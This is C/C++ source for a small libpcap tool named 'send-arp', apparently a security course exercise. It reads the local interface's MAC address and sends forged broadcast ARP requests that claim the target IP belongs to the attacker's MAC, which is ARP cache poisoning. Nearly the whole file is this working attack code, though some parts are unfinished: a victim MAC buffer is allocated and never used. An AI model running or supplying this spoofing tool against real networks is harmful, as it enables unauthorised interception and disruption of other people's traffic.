#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <ctype.h>
#include <assert.h>
void get_mac_addr(char *buf,size_t bufsiz,const char *interface){
	size_t namelen=strlen(interface);
	char* tmp=(char*)malloc(namelen+24);
	if(tmp==nullptr){
		printf("allocation failed\n");
		exit(1);
	}
	strcpy(tmp,"/sys/class/net/");
	strcpy(tmp+15,interface);
	strcpy(tmp+15+namelen,"/address");
	FILE *fp=fopen(tmp,"rb");
	free(tmp);
	if(fp==nullptr){
		printf("cannot access to \"%s\"\n",interface);
		exit(1);
	}
	size_t bytesnum=fread(buf,1,bufsiz,fp);
	fclose(fp);
	while(bytesnum&&isspace(buf[bytesnum-1]))
		bytesnum--;
	assert(bytesnum<bufsiz); // if assertion fail, buffer size is too small
	buf[bytesnum]='\0';
}

void arp_request(uint8_t *buf,const uint8_t *sip,const uint8_t *tip,const uint8_t *smac,const char *dev){
	uint8_t arp_eth[42]={
		255,255,255,255,255,255,
		0,0,0,0,0,0,
		8,6,0,1,8,0,6,4, // arp, ethernet, ipv4
		0,1 // request
	};
	memcpy(arp_eth+6,smac,6);
	memcpy(arp_eth+22,smac,6);
	memcpy(arp_eth+28,sip,4);
	memcpy(arp_eth+38,tip,4);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle=pcap_open_live(dev,0,0,0,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_sendpacket(handle,arp_eth,42);
	pcap_close(handle);
}

void arp_spoof(const char *str_sip,const char *str_tip,const char *str_mac,const char *dev){
	uint8_t sip[4];
	sscanf(str_sip,"%hhu.%hhu.%hhu.%hhu",sip,sip+1,sip+2,sip+3);
	uint8_t tip[4];
	sscanf(str_tip,"%hhu.%hhu.%hhu.%hhu",tip,tip+1,tip+2,tip+3);
	uint8_t mac[6];
	sscanf(str_mac,"%hhx%*c%hhx%*c%hhx%*c%hhx%*c%hhx%*c%hhx",
		mac,mac+1,mac+2,mac+3,mac+4,mac+5);
	uint8_t victim_mac[6];
	arp_request(victim_mac,tip,sip,mac,dev);
}

int main(int c,char **v){
	if(c&1){
		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
		return 1;
	}
	char mac[20];
	get_mac_addr(mac,20,v[1]);
	for(int i=2;i<c;i+=2)
		arp_spoof(v[i],v[i+1],mac,v[1]);
	return 0;
}
